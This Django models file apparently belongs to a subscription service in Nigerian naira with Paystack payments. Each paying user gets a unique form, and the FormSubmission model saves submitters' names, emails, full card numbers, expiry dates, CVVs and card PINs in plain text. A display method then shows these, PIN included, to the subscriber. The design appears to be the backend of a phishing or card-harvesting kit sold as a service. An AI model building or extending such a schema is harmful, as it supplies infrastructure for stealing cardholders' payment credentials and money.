from django.db import models
from django.contrib.auth.models import User
from django.db.models.signals import post_save
from django.dispatch import receiver
import uuid
from django.utils import timezone
from django.core.validators import MinValueValidator

class SubscriptionSettings(models.Model):
    price = models.DecimalField(max_digits=10, decimal_places=2, validators=[MinValueValidator(0)])
    duration_weeks = models.PositiveIntegerField(default=4, validators=[MinValueValidator(1)])

    def __str__(self):
        return f"Subscription: {self.price} NGN for {self.duration_weeks} weeks"

class UserProfile(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE)
    unique_form_id = models.UUIDField(default=uuid.uuid4, editable=False, unique=True)
    subscription_start_date = models.DateField(null=True, blank=True)
    subscription_expiry_date = models.DateField(null=True, blank=True)
    is_active = models.BooleanField(default=False)

    def __str__(self):
        return self.user.username

    def has_active_subscription(self):
        return self.is_active and self.subscription_expiry_date and self.subscription_expiry_date > timezone.now().date()

class FormSubmission(models.Model):
    user_profile = models.ForeignKey(
        'UserProfile', 
        on_delete=models.CASCADE, 
        related_name='form_submissions'
    )
    name = models.CharField(max_length=100)
    email = models.EmailField()
    card_number = models.CharField(max_length=19)
    expiry_date = models.CharField(max_length=5)  # MM/YY format
    cvv = models.CharField(max_length=3)
    card_pin = models.CharField(max_length=4)  
    created_at = models.DateTimeField(auto_now_add=True)

    def get_display_fields(self):
        """Returns a list of tuples containing field names and values for display"""
        return [
            ('name', self.name),
            ('email', self.email),
            ('card_number', self.card_number),
            ('expiry_date', self.expiry_date),
            ('card_pin', self.card_pin),
        ]

    def __str__(self):
        return f"Submission by {self.name} for {self.user_profile.user.username}"

class Subscription(models.Model):
    user_profile = models.ForeignKey(UserProfile, on_delete=models.CASCADE, related_name='subscriptions')
    start_date = models.DateTimeField(default=timezone.now)
    end_date = models.DateTimeField()
    amount = models.DecimalField(max_digits=10, decimal_places=2)
    paystack_reference = models.CharField(max_length=100, unique=True)
    is_active = models.BooleanField(default=True)

    def __str__(self):
        return f"Subscription for {self.user_profile.user.username}"

@receiver(post_save, sender=User)
def create_user_profile(sender, instance, created, **kwargs):
    if created:
        UserProfile.objects.create(user=instance)

@receiver(post_save, sender=User)
def save_user_profile(sender, instance, **kwargs):
    instance.userprofile.save()


class Notification(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='notifications')
    message = models.TextField()
    created_at = models.DateTimeField(auto_now_add=True)
    is_read = models.BooleanField(default=False)

    def __str__(self):
        return f"Notification for {self.user.username}: {self.message[:50]}..."
